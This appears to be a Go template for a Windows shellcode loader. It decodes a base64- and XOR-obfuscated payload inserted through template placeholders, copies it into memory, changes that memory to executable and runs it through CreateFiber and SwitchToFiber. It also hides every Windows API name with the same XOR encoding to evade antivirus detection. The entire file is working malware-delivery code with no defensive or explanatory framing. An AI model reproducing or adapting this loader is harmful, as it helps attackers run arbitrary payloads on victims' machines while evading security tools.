package main

import (
	"encoding/base64"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
	_ "fmt"
	_ "math"
	_ "os"
)

var (
	kernel32             = syscall.MustLoadDLL(encodeString(`{{encode "kernel32.dll" .Key }}`))
	virtualAlloc       	 = kernel32.MustFindProc(encodeString(`{{encode "VirtualAlloc" .Key }}`))
	virtualProtect     	 = kernel32.MustFindProc(encodeString(`{{encode "VirtualProtect" .Key }}`))
	writeProcessMemory   = kernel32.MustFindProc(encodeString(`{{encode "WriteProcessMemory" .Key}}`))
	createFiber          = kernel32.MustFindProc(encodeString(`{{encode "CreateFiber" .Key}}`))
	convertThreadToFiber = kernel32.MustFindProc(encodeString(`{{encode "ConvertThreadToFiber" .Key }}`))
	switchToFiber        = kernel32.MustFindProc(encodeString(`{{encode "SwitchToFiber" .Key }}`))
	key                  = "{{ .Key }}"
)

func encodeString(s string) (res string) {
	tmp, _ := base64.StdEncoding.DecodeString(s)
	x, _ := base64.StdEncoding.DecodeString(key)
	for i := 0; i < len(tmp); i++ {
		res += string(tmp[i] ^ x[i%len(x)])
	}
	return
}

func encodeByteArray(s string) (res []byte) {
	tmp, _ := base64.StdEncoding.DecodeString(s)
	x, _ := base64.StdEncoding.DecodeString(key)
	for i := 0; i < len(tmp); i++ {
		res = append(res, tmp[i]^x[i%len(x)])
	}
	return
}

func main() {
	sc := encodeByteArray("{{ .ShellcodeEncoded }}")
	n := {{ .Size }}

	fiberAddr, _, _ := convertThreadToFiber.Call()

	addr, _, _ := virtualAlloc.Call(uintptr(0), uintptr(n), windows.MEM_RESERVE | windows.MEM_COMMIT, windows.PAGE_READWRITE)
	buf := (*[{{ .Size }}]byte)(unsafe.Pointer(addr))
	
	for i := 0; i < n; i++ {
		buf[i] = sc[i]	
	}
	var oldProtect uint32	
	_, _, _ = virtualProtect.Call(addr, uintptr(n), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	fiber, _, _ := createFiber.Call(0, addr, 0)
	_, _, _ = switchToFiber.Call(fiber)
	_, _, _ = switchToFiber.Call(fiberAddr)

}
